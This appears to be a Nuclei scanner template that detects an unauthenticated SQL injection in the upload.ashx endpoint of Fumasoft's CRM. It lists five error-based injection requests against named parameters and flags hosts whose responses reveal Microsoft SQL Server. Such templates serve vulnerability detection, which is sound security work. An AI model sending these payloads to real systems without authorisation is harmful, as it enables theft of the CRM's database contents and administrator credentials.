id: fumasoft-upload-param-sqli
info:
  name: 孚盟云 CRM upload.ashx param - sqli
  author: leadlife
  severity: high
  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云upload.ashx接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/bpq77ch46gteegs6
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fumasoft,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/Ajax/upload.ashx?action=showImgss&FID=1'and+1<@@version--"
      - "{{BaseURL}}/Ajax/upload.ashx?action=showSmallImg&id=1+and+1<@@version--&tabname=bfContacts&imgField=FID"
      - "{{BaseURL}}/Ajax/upload.ashx?action=showProdImg&FID==1')+and+1<@@version--"
      - "{{BaseURL}}/Ajax/upload.ashx?action=image&CardID=1'and+1<@@version--&imagefb=FID"
      - "{{BaseURL}}/Ajax/upload.ashx?action=DownLoadFieldAttch&trueFileName=1'and+1<@@version--"
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'Microsoft SQL Server')
        condition: and